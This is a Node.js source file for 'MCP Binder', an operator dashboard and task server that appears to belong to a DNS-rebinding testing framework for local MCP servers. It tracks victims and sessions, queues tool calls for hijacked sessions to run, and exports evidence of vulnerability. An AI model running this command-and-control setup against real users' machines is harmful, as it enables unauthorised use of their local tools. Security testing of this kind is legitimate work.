import http from "node:http";
import fs from "node:fs";
import path from "node:path";
import { randomBytes } from "node:crypto";

const args = process.argv.slice(2);
const options = {
  host: getOption(args, "--host") || process.env.MCP_BINDER_DASHBOARD_HOST || "0.0.0.0",
  port: Number(getOption(args, "--port") || process.env.MCP_BINDER_DASHBOARD_PORT || 8090),
  token: getOption(args, "--token") || process.env.MCP_BINDER_DASHBOARD_TOKEN || "",
  ingestToken: getOption(args, "--ingest-token") || process.env.MCP_BINDER_INGEST_TOKEN || "",
  allowUnauthenticatedIngest: args.includes("--allow-unauthenticated-ingest") || process.env.MCP_BINDER_ALLOW_UNAUTHENTICATED_INGEST === "1",
  evidenceDir: getOption(args, "--evidence-dir") || process.env.MCP_BINDER_EVIDENCE_DIR || "/tmp/mcp-binder-evidence",
  publicIp: process.env.MCP_BINDER_PUBLIC_IP || "127.0.0.1",
  rebindDomain: process.env.MCP_BINDER_REBIND_DOMAIN || "rebind.example.com",
  dashboardFqdn: process.env.MCP_BINDER_DASHBOARD_FQDN || "",
  launcherPort: Number(process.env.MCP_BINDER_LAUNCHER_PORT || firstPort(process.env.MCP_BINDER_HTTP_PORTS) || 8080),
  defaultTargetIp: process.env.MCP_BINDER_DEFAULT_TARGET_IP || "127.0.0.1",
  defaultTargetPort: Number(process.env.MCP_BINDER_DEFAULT_TARGET_PORT || 8086),
  defaultStrategy: process.env.MCP_BINDER_STRATEGY || "fs",
  defaultPayloadPath: process.env.MCP_BINDER_DEFAULT_PAYLOAD_PATH || "payloads/victim-launcher.html"
};

const STATE_LIMITS = {
  events: 200,
  results: 200,
  sessions: 100,
  victims: 100,
  tasksPerSession: 50
};

const SNAP_BACK_INTERACTION_CSS = `
.snapBackInteractive {
  will-change: transform;
}
.snapBackInteractive:not(button):not(a) {
  cursor: grab;
}
.snapBackInteractive.snapBackDragging {
  cursor: grabbing;
  transform: translate(var(--snap-x, 0px), var(--snap-y, 0px)) rotate(var(--snap-rotate, 0deg));
  transition: none;
  z-index: 2;
}
.snapBackInteractive.snapBackReturning {
  transform: translate(0, 0) rotate(0deg);
  transition: transform 280ms cubic-bezier(0.16, 1, 0.3, 1);
}
button.snapBackDragging,
a.snapBackDragging {
  filter: none !important;
}
.serverBrandTitle {
  display: inline-block;
  border-radius: 8px;
  padding: 4px 8px 5px;
  transition: background 160ms ease, box-shadow 160ms ease, transform 160ms ease;
}
.serverBrandTitle:hover {
  background: var(--yellow, #f4d331);
  color: var(--text, #111013);
  box-shadow: 3px 3px 0 var(--line, #19150f);
  transform: translate(-1px, -1px);
}
.tokenSavedHint {
  position: fixed;
  z-index: 80;
  color: var(--green-dark, #027a48);
  font-weight: 900;
  pointer-events: none;
  white-space: nowrap;
  text-shadow: 0 1px 0 var(--surface, #fffdf2);
  animation: tokenSavedFloat 1500ms ease forwards;
}
@keyframes tokenSavedFloat {
  0% { opacity: 0; transform: translateY(4px); }
  14% { opacity: 1; }
  72% { opacity: 1; transform: translateY(44px); }
  100% { opacity: 0; transform: translateY(72px); }
}
`;

const SNAP_BACK_INTERACTION_SCRIPT = `
function attachServerSnapBackInteractions() {
  const threshold = 5;
  const returnMs = 280;
  const selector = [
    "button",
    "a.button",
    ".pill",
    ".status",
    ".brand",
    ".serverBrandTitle",
    ".panel",
    ".card",
    ".metric",
    ".selectable",
    ".row",
    ".muted-box",
    ".auth",
    "details.panel > summary",
    ".summary-card",
    ".result-card",
    ".tool-card",
    ".candidate",
    ".ready-step",
    ".sessionItem",
    ".quick-action",
    ".saved-request",
    ".readiness > *",
    ".metric-grid > *",
    ".summary-grid > *",
    ".tool-grid > *",
    ".task-grid > *",
    ".finding-list li",
    ".operatorDialog"
  ].join(",");
  let active = null;

  function excluded(element) {
    return Boolean(
      element.closest("input")
      || element.closest("select")
      || element.closest("textarea")
      || element.closest("pre")
      || element.closest("code")
      || element.closest(".main-resizer")
      || element.closest(".workspace-resizer")
      || element.closest("[data-no-snap]")
    );
  }

  function refresh(scope) {
    const root = scope || document;
    if (root.matches && root.matches(selector) && !excluded(root)) {
      root.classList.add("snapBackInteractive");
    }
    root.querySelectorAll(selector).forEach((element) => {
      if (!excluded(element)) element.classList.add("snapBackInteractive");
    });
  }

  function clamp(value, min, max) {
    return Math.max(min, Math.min(max, value));
  }

  function start(event) {
    if (event.button !== 0 || active) return;
    const target = event.target.closest(".snapBackInteractive");
    if (!target || excluded(target)) return;
    active = { target, pointerId: event.pointerId, startX: event.clientX, startY: event.clientY, moved: false };
    target.classList.remove("snapBackReturning");
    try { target.setPointerCapture(event.pointerId); } catch (error) {}
    target.addEventListener("pointermove", move);
  }

  function move(event) {
    if (!active) return;
    const rawX = event.clientX - active.startX;
    const rawY = event.clientY - active.startY;
    if (Math.hypot(rawX, rawY) < threshold && !active.moved) return;
    active.moved = true;
    active.target.classList.add("snapBackDragging");
    active.target.style.setProperty("--snap-x", rawX + "px");
    active.target.style.setProperty("--snap-y", rawY + "px");
    active.target.style.setProperty("--snap-rotate", clamp(rawX / 28, -3, 3) + "deg");
  }

  function finishSnapBackInteraction(event) {
    if (!active) return;
    const target = active.target;
    const moved = active.moved;
    const pointerId = active.pointerId;
    active = null;
    try {
      if (pointerId !== undefined && target.hasPointerCapture(pointerId)) target.releasePointerCapture(pointerId);
    } catch (error) {}
    target.removeEventListener("pointermove", move);
    if (!moved) return;
    if (event && event.type === "contextmenu") event.preventDefault();
    target.dataset.snapBackMoved = "true";
    target.classList.remove("snapBackDragging");
    target.classList.add("snapBackReturning");
    target.style.setProperty("--snap-x", "0px");
    target.style.setProperty("--snap-y", "0px");
    target.style.setProperty("--snap-rotate", "0deg");
    window.setTimeout(() => {
      delete target.dataset.snapBackMoved;
      target.classList.remove("snapBackReturning");
      target.style.removeProperty("--snap-x");
      target.style.removeProperty("--snap-y");
      target.style.removeProperty("--snap-rotate");
    }, returnMs);
  }

  function suppressClick(event) {
    const target = event.target.closest(".snapBackInteractive");
    if (!target || !target.dataset.snapBackMoved) return;
    event.preventDefault();
    event.stopPropagation();
  }

  window.showTokenSavedHint = function showTokenSavedHint(anchor, message) {
    const existing = document.querySelector("#tokenSavedHint");
    if (existing) existing.remove();
    const hint = document.createElement("span");
    const rect = anchor ? anchor.getBoundingClientRect() : { left: 18, bottom: 18 };
    hint.id = "tokenSavedHint";
    hint.className = "tokenSavedHint";
    hint.setAttribute("role", "status");
    hint.textContent = message;
    hint.style.left = Math.max(12, rect.left) + "px";
    hint.style.top = Math.max(12, rect.bottom + 10) + "px";
    document.body.append(hint);
    window.setTimeout(() => hint.remove(), 1500);
  };

  refresh(document);
  document.addEventListener("pointerdown", start, true);
  document.addEventListener("pointerup", finishSnapBackInteraction, true);
  document.addEventListener("pointercancel", finishSnapBackInteraction, true);
  document.addEventListener("contextmenu", finishSnapBackInteraction, true);
  document.addEventListener("click", suppressClick, true);
  document.addEventListener("visibilitychange", () => finishSnapBackInteraction(), true);
  window.addEventListener("blur", () => finishSnapBackInteraction(), true);
  new MutationObserver((mutations) => {
    for (const mutation of mutations) {
      mutation.addedNodes.forEach((node) => {
        if (node.nodeType === Node.ELEMENT_NODE) refresh(node);
      });
    }
  }).observe(document.body, { childList: true, subtree: true });
}
`;

const state = createState();
if (!options.ingestToken && !options.allowUnauthenticatedIngest) {
  console.error("ingest token is required. Set MCP_BINDER_INGEST_TOKEN or pass --ingest-token.");
  process.exit(1);
}

const server = http.createServer((req, res) => {
  handleRequest(req, res).catch((error) => {
    json(res, 500, {
      error: error instanceof Error ? error.message : String(error)
    });
  });
});

server.listen(options.port, options.host, () => {
  const address = server.address();
  const port = typeof address === "object" && address ? address.port : options.port;
  process.stdout.write(`${JSON.stringify({
    ready: true,
    baseUrl: `http://${options.host}:${port}`,
    evidenceDir: options.evidenceDir
  })}\n`);
});

process.on("SIGTERM", () => {
  server.close(() => process.exit(0));
});

async function handleRequest(req, res) {
  setCorsHeaders(res);

  if (req.method === "OPTIONS") {
    res.writeHead(204);
    res.end();
    return;
  }

  const url = new URL(req.url, `http://${req.headers.host || "127.0.0.1"}`);
  const pathname = url.pathname;

  if (req.method === "GET" && pathname === "/") {
    html(res, 200, renderOperatorDashboard());
    return;
  }

  if (req.method === "GET" && pathname === "/ops") {
    html(res, 200, renderOpsDashboard());
    return;
  }

  if (req.method === "GET" && pathname === "/healthz") {
    json(res, 200, { ok: true });
    return;
  }

  if (req.method === "GET" && pathname === "/api/state") {
    if (!authorize(req, res)) {
      return;
    }
    json(res, 200, listState());
    return;
  }

  if (req.method === "GET" && pathname === "/api/export") {
    if (!authorize(req, res)) {
      return;
    }
    const evidence = exportEvidence();
    persistEvidence(evidence);
    json(res, 200, evidence);
    return;
  }

  if (req.method === "POST" && pathname === "/api/clear") {
    if (!authorize(req, res)) {
      return;
    }
    resetState();
    json(res, 200, listState());
    return;
  }

  if (req.method === "POST" && pathname === "/api/victims") {
    if (!authorizeIngest(req, res)) {
      return;
    }
    json(res, 200, registerVictim(await readJsonBody(req)));
    return;
  }

  if (req.method === "POST" && pathname === "/api/sessions") {
    if (!authorizeIngest(req, res)) {
      return;
    }
    json(res, 200, registerSession(await readJsonBody(req)));
    return;
  }

  if (req.method === "POST" && pathname === "/api/events") {
    if (!authorizeIngest(req, res)) {
      return;
    }
    json(res, 200, recordEvent(await readJsonBody(req)));
    return;
  }

  if (req.method === "POST" && pathname === "/api/results") {
    if (!authorizeIngest(req, res)) {
      return;
    }
    json(res, 200, recordResult(await readJsonBody(req)));
    return;
  }

  const taskMatch = pathname.match(/^\/api\/tasks\/([^/]+)$/);
  if (taskMatch && req.method === "GET") {
    if (!authorizeIngest(req, res)) {
      return;
    }
    json(res, 200, takeTasks(decodeURIComponent(taskMatch[1])));
    return;
  }

  if (taskMatch && req.method === "POST") {
    if (!authorize(req, res)) {
      return;
    }
    json(res, 200, queueTask(decodeURIComponent(taskMatch[1]), await readJsonBody(req)));
    return;
  }

  if (req.method === "POST" && pathname === "/c") {
    if (!authorizeIngest(req, res)) {
      return;
    }
    const payload = await readJsonBody(req);
    const result = recordEvent({
      kind: "legacy.dashboard",
      session: payload.session || payload.sessionId || "",
      payload
    });
    json(res, 200, result);
    return;
  }

  json(res, 404, { error: "not found" });
}

function createState() {
  return {
    events: [],
    victims: {},
    sessions: {},
    tasks: {},
    results: [],
    lab: labConfig()
  };
}

function resetState() {
  state.events = [];
  state.victims = {};
  state.sessions = {};
  state.tasks = {};
  state.results = [];
}

function listState() {
  return clone({
    ...state,
    lab: labConfig(),
    exportedAt: new Date().toISOString()
  });
}

function registerVictim(payload = {}) {
  const id = requiredId(payload.id, "victim id is required");
  const now = new Date().toISOString();
  const existing = state.victims[id] || {};
  const victim = {
    ...existing,
    ...payload,
    id,
    firstSeen: existing.firstSeen || payload.firstSeen || now,
    lastSeen: now,
    sessions: unique([...(existing.sessions || []), ...(payload.sessions || [])]),
    ports: unique([...(existing.ports || []), ...(payload.ports || [])])
  };
  state.victims[id] = victim;
  pruneObjectByAge(state.victims, STATE_LIMITS.victims);
  return clone(victim);
}

function registerSession(payload = {}) {
  const id = requiredId(payload.id || payload.sessionId, "session id is required");
  const now = new Date().toISOString();
  const existing = state.sessions[id] || {};
  const session = {
    ...existing,
    ...payload,
    id,
    firstSeen: existing.firstSeen || payload.firstSeen || now,
    lastSeen: now
  };
  state.sessions[id] = session;
  pruneObjectByAge(state.sessions, STATE_LIMITS.sessions);

  if (session.victimId && !state.victims[session.victimId]) {
    state.victims[session.victimId] = {
      id: session.victimId,
      displayName: session.victimId,
      firstSeen: session.firstSeen,
      lastSeen: now,
      sessions: [],
      ports: unique([session.descriptor?.port, session.meta?.port]),
      origin: session.origin || "",
      campaignId: session.campaignId || ""
    };
  }

  if (session.victimId && state.victims[session.victimId]) {
    state.victims[session.victimId].sessions = unique([...(state.victims[session.victimId].sessions || []), id]);
    state.victims[session.victimId].lastSeen = now;
  }

  return clone(session);
}

function recordEvent(payload = {}) {
  const event = {
    id: payload.id || `event-${Date.now()}-${state.events.length + 1}`,
    receivedAt: new Date().toISOString(),
    ...payload
  };
  state.events.push(event);
  trimArray(state.events, STATE_LIMITS.events);
  return clone(event);
}

function recordResult(payload = {}) {
  const result = {
    id: payload.id || `result-${Date.now()}-${state.results.length + 1}`,
    receivedAt: new Date().toISOString(),
    ...payload
  };
  state.results.push(result);
  trimArray(state.results, STATE_LIMITS.results);
  return clone(result);
}

function queueTask(sessionId, payload = {}) {
  requiredId(sessionId, "session id is required");
  const task = {
    id: payload.id || `task-${Date.now()}-${(state.tasks[sessionId] || []).length + 1}`,
    createdAt: new Date().toISOString(),
    kind: payload.kind || "tools/list",
    tool: payload.tool || "",
    args: payload.args || {},
    rpc: payload.rpc || null,
    name: payload.name || ""
  };
  state.tasks[sessionId] = [...(state.tasks[sessionId] || []), task];
  trimArray(state.tasks[sessionId], STATE_LIMITS.tasksPerSession);
  recordEvent({
    kind: "task-created",
    payload: {
      session: sessionId,
      task
    }
  });
  return { task: clone(task) };
}

function trimArray(items, maxItems) {
  if (!Array.isArray(items) || items.length <= maxItems) {
    return;
  }
  items.splice(0, items.length - maxItems);
}

function pruneObjectByAge(items, maxItems) {
  const entries = Object.entries(items || {});
  if (entries.length <= maxItems) {
    return;
  }
  entries
    .sort(([, a], [, b]) => String(a.lastSeen || a.firstSeen || "").localeCompare(String(b.lastSeen || b.firstSeen || "")))
    .slice(0, entries.length - maxItems)
    .forEach(([key]) => {
      delete items[key];
    });
}

function takeTasks(sessionId) {
  requiredId(sessionId, "session id is required");
  const queue = state.tasks[sessionId] || [];
  const task = queue.find((item) => !item.claimedAt) || null;
  if (task) {
    task.claimedAt = new Date().toISOString();
    recordEvent({
      kind: "task-claimed",
      payload: {
        session: sessionId,
        task
      }
    });
  }
  return { task: clone(task) };
}

function exportEvidence() {
  const sessions = Object.keys(state.sessions);
  const tools = discoveredTools(state.results);
  const campaignId = firstCampaignId();

  return {
    frameworkVersion: "0.1.0",
    exportedAt: new Date().toISOString(),
    verdict: tools.length > 0 ? "vulnerable" : sessions.length > 0 ? "not_confirmed" : "inconclusive",
    infra: {
      dashboardMode: "remote-http"
    },
    dashboardState: listState(),
    proof: {
      campaignId,
      sessions,
      results: clone(state.results),
      tools,
      limitations: []
    }
  };
}

function firstCampaignId() {
  for (const session of Object.values(state.sessions)) {
    if (session.campaignId) {
      return session.campaignId;
    }
  }
  return "";
}

function discoveredTools(results) {
  const seen = new Set();
  const tools = [];
  for (const result of results) {
    for (const tool of findTools(result.data)) {
      if (!tool.name || seen.has(tool.name)) {
        continue;
      }
      seen.add(tool.name);
      tools.push(tool);
    }
  }
  return tools;
}

function findTools(value, out = []) {
  if (!value || typeof value !== "object") {
    return out;
  }

  if (Array.isArray(value)) {
    for (const item of value) {
      findTools(item, out);
    }
    return out;
  }

  if (Array.isArray(value.tools)) {
    for (const tool of value.tools) {
      if (tool && typeof tool === "object") {
        out.push(tool);
      }
    }
  }

  for (const item of Object.values(value)) {
    findTools(item, out);
  }

  return out;
}

function persistEvidence(evidence) {
  fs.mkdirSync(options.evidenceDir, { recursive: true });
  const filename = `evidence-${evidence.exportedAt.replace(/[:.]/g, "-")}.json`;
  fs.writeFileSync(path.join(options.evidenceDir, filename), `${JSON.stringify(evidence, null, 2)}\n`);
}

function authorize(req, res) {
  if (!options.token) {
    return true;
  }

  if (req.headers.authorization === `Bearer ${options.token}`) {
    return true;
  }

  json(res, 401, { error: "unauthorized" });
  return false;
}

function authorizeIngest(req, res) {
  if (!options.ingestToken) {
    return true;
  }

  if (req.headers["x-mcp-binder-ingest-token"] === options.ingestToken) {
    return true;
  }

  json(res, 401, { error: "unauthorized ingest" });
  return false;
}

async function readJsonBody(req) {
  const text = await new Promise((resolve, reject) => {
    let body = "";
    req.on("data", (chunk) => {
      body += chunk.toString();
      if (body.length > 1024 * 1024) {
        reject(new Error("request body too large"));
        req.destroy();
      }
    });
    req.on("end", () => resolve(body));
    req.on("error", reject);
  });

  if (!text) {
    return {};
  }

  return JSON.parse(text);
}

function json(res, status, body) {
  setCorsHeaders(res);
  res.writeHead(status, {
    "content-type": "application/json; charset=utf-8",
    "cache-control": "no-store"
  });
  res.end(`${JSON.stringify(body, null, 2)}\n`);
}

function html(res, status, body) {
  const nonce = createCspNonce();
  const securedBody = applyScriptNonce(body, nonce);
  setCorsHeaders(res);
  res.writeHead(status, {
    "content-type": "text/html; charset=utf-8",
    "cache-control": "no-store",
    "content-security-policy": contentSecurityPolicy(nonce)
  });
  res.end(securedBody);
}

function createCspNonce() {
  return randomBytes(16).toString("base64");
}

function applyScriptNonce(body, nonce) {
  return String(body).replace(/<script(?![^>]*\bnonce=)/g, `<script nonce="${nonce}"`);
}

function contentSecurityPolicy(nonce) {
  return [
    "default-src 'self'",
    "base-uri 'none'",
    "object-src 'none'",
    "frame-ancestors 'none'",
    `script-src 'self' 'nonce-${nonce}'`,
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data:",
    "connect-src 'self'"
  ].join("; ");
}

function renderDashboard() {
  return `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>MCP Binder Dashboard</title>
<style>
:root {
  color-scheme: light;
  --bg: #fff8dc;
  --panel: #fffdf3;
  --ink: #171410;
  --muted: #6b665a;
  --line: #1f1b15;
  --accent: #f3ce3e;
  --green: #2f9f69;
  --red: #d95045;
}
* { box-sizing: border-box; }
body {
  margin: 0;
  background:
    linear-gradient(rgba(31,27,21,.04) 1px, transparent 1px),
    linear-gradient(90deg, rgba(31,27,21,.04) 1px, transparent 1px),
    var(--bg);
  background-size: 24px 24px;
  color: var(--ink);
  font: 14px/1.45 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
}
main { width: min(1180px, calc(100vw - 32px)); margin: 32px auto; }
header { display: flex; justify-content: space-between; gap: 16px; align-items: flex-end; margin-bottom: 16px; }
.eyebrow { font-size: 12px; font-weight: 800; letter-spacing: .04em; text-transform: uppercase; color: var(--muted); }
h1 { margin: 0; font-size: clamp(32px, 6vw, 64px); line-height: .9; letter-spacing: 0; }
.status { border: 3px solid var(--line); border-radius: 999px; padding: 8px 18px; background: #2f9f69; color: #fffdf2; font-weight: 800; box-shadow: 3px 3px 0 var(--line); }
.grid { display: grid; grid-template-columns: 340px 1fr; gap: 16px; align-items: start; }
.panel { border: 3px solid var(--line); border-radius: 8px; background: var(--panel); box-shadow: 3px 3px 0 var(--line); padding: 16px; }
.panel h2 { margin: 0 0 12px; font-size: 18px; }
label { display: block; margin: 10px 0 6px; font-weight: 800; font-size: 12px; }
input { width: 100%; border: 2px solid var(--line); border-radius: 6px; padding: 10px; background: white; color: var(--ink); font: inherit; }
button, a.button { display: inline-flex; align-items: center; justify-content: center; min-height: 36px; border: 3px solid var(--line); border-radius: 999px; padding: 0 14px; background: var(--accent); color: var(--ink); font-weight: 900; text-decoration: none; box-shadow: 2px 2px 0 var(--line); cursor: pointer; }
button.dark { background: var(--ink); color: white; }
button.danger { background: #ff766f; }
.row { display: flex; gap: 8px; flex-wrap: wrap; align-items: center; }
.cards { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 10px; margin-bottom: 14px; }
.card { border: 2px solid var(--line); border-radius: 6px; background: #fff4bc; padding: 12px; min-height: 78px; }
.card span { display: block; color: var(--muted); font-size: 12px; font-weight: 800; }
.card strong { display: block; margin-top: 8px; font-size: 28px; }
pre { margin: 0; min-height: 360px; max-height: 62vh; overflow: auto; border: 2px solid var(--line); border-radius: 6px; padding: 12px; background: #171a15; color: #f7f4de; font: 12px/1.45 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; white-space: pre-wrap; }
.hint { color: var(--muted); margin: 10px 0 0; }
.error { color: var(--red); font-weight: 800; }
.operatorDialogOverlay {
  position: fixed;
  inset: 0;
  z-index: 40;
  display: grid;
  place-items: center;
  padding: 18px;
  background: rgba(17, 16, 19, .42);
}
.operatorDialog {
  display: grid;
  gap: 12px;
  width: min(470px, calc(100vw - 36px));
  border: 3px solid var(--line);
  border-radius: 8px;
  padding: 16px;
  background: var(--panel);
  box-shadow: 5px 5px 0 var(--line);
}
.operatorDialogEyebrow {
  margin: 0;
  color: var(--muted);
  font-size: 11px;
  font-weight: 900;
  letter-spacing: .04em;
  text-transform: uppercase;
}
.operatorDialog h2 {
  margin: 0;
}
.operatorDialogBody {
  margin: 0;
  color: var(--muted);
  font-size: 13px;
  font-weight: 800;
  line-height: 1.45;
}
.operatorDialogActions {
  display: flex;
  justify-content: flex-end;
  gap: 8px;
  flex-wrap: wrap;
}
${SNAP_BACK_INTERACTION_CSS}
@media (max-width: 860px) {
  .grid { grid-template-columns: 1fr; }
  .cards { grid-template-columns: repeat(2, minmax(0, 1fr)); }
  header { align-items: flex-start; flex-direction: column; }
}
</style>
</head>
<body>
<main>
  <header>
    <div>
      <div class="eyebrow">MCP Binder</div>
      <h1>MCP Binder Dashboard</h1>
    </div>
    <div class="status" id="status">loading</div>
  </header>
  <div class="grid">
    <section class="panel">
      <h2>Operator</h2>
      <label for="token">Bearer token</label>
      <input id="token" type="password" autocomplete="off" placeholder="paste dashboard token">
      <p class="hint">Token is kept in this browser only.</p>
      <div class="row" style="margin-top:14px">
        <button class="dark" id="refresh">Refresh</button>
        <button class="danger" id="clear">Clear live state</button>
        <button id="export">Export evidence</button>
      </div>
      <p class="hint">API: <code>/api/state</code>, <code>/api/export</code>, <code>/api/tasks/:session</code>.</p>
      <p id="message" class="hint"></p>
    </section>
    <section class="panel">
      <h2>Live State</h2>
      <div class="cards">
        <div class="card"><span>Victims</span><strong id="victims">-</strong></div>
        <div class="card"><span>Sessions</span><strong id="sessions">-</strong></div>
        <div class="card"><span>Results</span><strong id="results">-</strong></div>
        <div class="card"><span>Tasks</span><strong id="tasks">-</strong></div>
      </div>
      <pre id="state">{}</pre>
    </section>
  </div>
</main>
<script>
const tokenInput = document.querySelector("#token");
const statusEl = document.querySelector("#status");
const messageEl = document.querySelector("#message");
const stateEl = document.querySelector("#state");
const counts = {
  victims: document.querySelector("#victims"),
  sessions: document.querySelector("#sessions"),
  results: document.querySelector("#results"),
  tasks: document.querySelector("#tasks")
};

tokenInput.value = localStorage.getItem("mcp-binder.dashboard.token") || "";
tokenInput.addEventListener("input", () => localStorage.setItem("mcp-binder.dashboard.token", tokenInput.value));
document.querySelector("#refresh").addEventListener("click", refresh);
document.querySelector("#clear").addEventListener("click", clearState);
document.querySelector("#export").addEventListener("click", exportEvidence);
refresh();

async function refresh() {
  setMessage("");
  const response = await api("/api/state");
  renderResponse(response);
}

async function clearState() {
  setMessage("");
  const approved = await showDecisionDialog({
    title: "Clear live state",
    body: "Clear live dashboard sessions, tasks, results, and in-memory events? JSONL evidence on disk is not deleted.",
    confirmLabel: "Clear Live State",
    cancelLabel: "Cancel"
  });
  if (!approved) return;
  const response = await api("/api/clear", { method: "POST" });
  renderResponse(response);
}

async function exportEvidence() {
  setMessage("");
  const response = await api("/api/export");
  if (response.ok) {
    download("mcp-binder-evidence.json", JSON.stringify(response.body, null, 2) + "\\n");
  }
  renderResponse(response);
}

async function api(path, options = {}) {
  const headers = { accept: "application/json" };
  if (tokenInput.value) {
    headers.authorization = "Bearer " + tokenInput.value;
  }
  try {
    const response = await fetch(path, { method: options.method || "GET", headers });
    const text = await response.text();
    return {
      ok: response.ok,
      status: response.status,
      body: text ? JSON.parse(text) : null
    };
  } catch (error) {
    return { ok: false, status: 0, body: { error: error.message } };
  }
}

function renderResponse(response) {
  statusEl.textContent = response.ok ? "ready" : "error";
  statusEl.style.background = response.ok ? "#2f9f69" : "#ff766f";
  statusEl.style.color = response.ok ? "#fffdf2" : "#111013";
  stateEl.textContent = JSON.stringify(response.body, null, 2);
  if (!response.ok) {
    setMessage(response.body?.error || "request failed", true);
  }
  const body = response.body || {};
  counts.victims.textContent = String(Object.keys(body.victims || {}).length);
  counts.sessions.textContent = String(Object.keys(body.sessions || {}).length);
  counts.results.textContent = String((body.results || []).length);
  counts.tasks.textContent = String(Object.values(body.tasks || {}).reduce((total, tasks) => total + (Array.isArray(tasks) ? tasks.length : 0), 0));
}

function setMessage(value, error = false) {
  messageEl.textContent = value;
  messageEl.className = error ? "hint error" : "hint";
}

function download(filename, text) {
  const blob = new Blob([text], { type: "application/json" });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = filename;
  link.click();
  URL.revokeObjectURL(url);
}
function showDecisionDialog(options = {}) {
  return new Promise((resolve) => {
    const existing = document.querySelector("#operatorDialogOverlay");
    if (existing) existing.remove();
    const overlay = document.createElement("div");
    overlay.id = "operatorDialogOverlay";
    overlay.className = "operatorDialogOverlay";
    const dialog = document.createElement("section");
    dialog.className = "operatorDialog";
    dialog.setAttribute("role", "dialog");
    dialog.setAttribute("aria-modal", "true");
    dialog.setAttribute("aria-labelledby", "operatorDialogTitle");
    const eyebrow = document.createElement("p");
    eyebrow.className = "operatorDialogEyebrow";
    eyebrow.textContent = "Confirm";
    const title = document.createElement("h2");
    title.id = "operatorDialogTitle";
    title.textContent = options.title || "Confirm action";
    const body = document.createElement("p");
    body.className = "operatorDialogBody";
    body.textContent = options.body || "";
    const actions = document.createElement("div");
    actions.className = "operatorDialogActions";
    const cancel = document.createElement("button");
    cancel.type = "button";
    cancel.className = "dark";
    cancel.textContent = options.cancelLabel || "Cancel";
    const confirm = document.createElement("button");
    confirm.type = "button";
    confirm.textContent = options.confirmLabel || "Confirm";
    function finish(value) {
      overlay.remove();
      document.removeEventListener("keydown", onKeydown);
      resolve(value);
    }
    function onKeydown(event) {
      if (event.key === "Escape") finish(false);
    }
    cancel.addEventListener("click", () => finish(false));
    confirm.addEventListener("click", () => finish(true));
    overlay.addEventListener("click", (event) => {
      if (event.target === overlay) finish(false);
    });
    document.addEventListener("keydown", onKeydown);
    actions.append(cancel, confirm);
    dialog.append(eyebrow, title, body, actions);
    overlay.append(dialog);
    document.body.append(overlay);
    cancel.focus();
  });
}
${SNAP_BACK_INTERACTION_SCRIPT}
attachServerSnapBackInteractions();
</script>
</body>
</html>`;
}

function renderOperatorDashboard() {
  return `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>MCP Binder Dashboard</title>
<style>
:root {
  --text: #111013;
  --muted: #6b6256;
  --bg: #fff8dc;
  --surface: #fffdf2;
  --surface-2: #fff3b8;
  --line: #19150f;
  --green: #2f9f69;
  --dark-green: #14815a;
  --yellow: #f4d331;
  --yellow-soft: #fff3b8;
  --code: #191b16;
  --error: #e2554d;
}
* { box-sizing: border-box; }
body {
  margin: 0;
  font: 14px/1.45 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
  color: var(--text);
  background:
    linear-gradient(rgba(17, 16, 19, .035) 1px, transparent 1px),
    linear-gradient(90deg, rgba(17, 16, 19, .035) 1px, transparent 1px),
    var(--bg);
  background-size: 32px 32px;
}
header {
  height: 64px;
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 28px;
  border-bottom: 3px solid var(--line);
  background: var(--text);
  color: #fffdf2;
}
.brand {
  display: flex;
  align-items: center;
  gap: 10px;
  font-weight: 800;
  letter-spacing: 0;
}
.mark {
  width: 28px;
  height: 28px;
  border-radius: 50%;
  background: var(--green);
  border: 2px solid #fffdf2;
  display: inline-block;
}
.topline { display: flex; align-items: center; gap: 10px; color: #fff3b8; font-size: 13px; }
.pill {
  border: 2px solid #fffdf2;
  border-radius: 999px;
  padding: 5px 10px;
  background: #2a251d;
  color: #fffdf2;
}
main {
  display: grid;
  grid-template-columns: 320px minmax(0, 1fr);
  min-height: calc(100vh - 64px);
}
aside {
  border-right: 3px solid var(--line);
  padding: 22px;
  background: rgba(255, 253, 242, .82);
}
section {
  padding: 22px 28px;
}
h1 { margin: 0 0 4px; font-size: 24px; line-height: 1.15; letter-spacing: 0; }
h2 { margin: 0 0 14px; font-size: 15px; letter-spacing: 0; }
p { margin:0; color:var(--muted); }
label { display: block; margin: 12px 0 6px; font-weight: 600; font-size: 12px; }
input, textarea, select {
  width: 100%;
  border: 2px solid var(--line);
  border-radius: 6px;
  padding: 9px 10px;
  font: inherit;
  background: #fffdf2;
  color: var(--text);
}
input:focus, textarea:focus, select:focus { outline: 3px solid rgba(244, 211, 49, .42); }
textarea { min-height: 92px; resize: vertical; font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
button {
  border: 2px solid var(--line);
  border-radius: 6px;
  padding: 9px 12px;
  background: var(--text);
  color: #fff;
  font-weight: 700;
  cursor: pointer;
  box-shadow: 0 2px 0 var(--line);
}
button.secondary { background: var(--yellow); color: var(--text); }
button:disabled { opacity: .45; cursor: default; }
.grid { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 14px; margin: 18px 0; }
.metric { border: 2px solid var(--line); border-radius: 8px; padding: 14px; background: var(--yellow-soft); }
.metric b { display: block; font-size: 24px; }
.metric span { color: var(--muted); font-size: 12px; }
.panes { display: grid; grid-template-columns: minmax(260px, .75fr) minmax(340px, 1fr); gap: 16px; }
.panel { border: 3px solid var(--line); border-radius: 8px; min-height: 220px; background: var(--surface); box-shadow: 0 4px 0 rgba(17, 16, 19, .18); }
.panel-head { display:flex; align-items:center; justify-content:space-between; padding: 12px 14px; border-bottom: 2px solid var(--line); background: #fffdf2; border-radius: 6px 6px 0 0; }
.panel-body { padding: 10px 14px; max-height: 520px; overflow: auto; }
.row { border-bottom: 1px solid #e8dec5; padding: 10px 0; cursor: default; }
.selectable { cursor: pointer; }
.selectable:hover { background: #fff9df; }
.selectable.active { background: var(--yellow-soft); border-left: 4px solid var(--yellow); padding-left: 8px; }
